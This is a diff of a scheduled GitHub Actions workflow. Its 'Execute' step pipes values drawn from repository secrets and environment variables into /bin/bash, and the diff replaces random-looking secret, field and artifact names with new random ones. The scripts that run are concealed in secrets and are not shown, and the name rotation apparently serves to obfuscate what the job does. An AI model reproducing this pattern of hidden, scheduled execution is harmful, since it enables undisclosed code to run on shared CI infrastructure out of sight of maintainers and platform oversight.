@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '37 2,8,14,20 * * *'
+    - cron: '27 2,8,14,20 * * *'
 env:
   CI: true
 concurrency:
@@ -19,17 +19,18 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          c87: ${{ secrets.c87 }}
+          eufnr06183: ${{ secrets.eufnr06183 }}
         run: |
-          printf '%s' "$c87" | jq -r .ua991 | /bin/bash
-          echo $hygx7013 | jq -r .x7 | /bin/bash
-          printf '%s' "$qnka2722" | jq -r .gv65910 | /bin/bash
-          echo $pthwt4507 | jq -r .mg265 | /bin/bash
-          printf '%s' "$p0114" | jq -r .iqwan7 | /bin/bash
+          printf '%s' "$eufnr06183" | jq -r .ump546 | /bin/bash
+          echo $rob9 | jq -r .kdh85632 | /bin/bash
+          echo $ebfj7 | jq -r .eju3211 | /bin/bash
+          echo $ax88 | jq -r .uquqy69 | /bin/bash
+          printf '%s' "$wpuh5" | jq -r .i1 | /bin/bash
+          printf '%s' "$of90" | jq -r .ikne88 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: JZdkBfCl
+          name: Mj0kQhep
           path: "*.zip"
           retention-days: 1
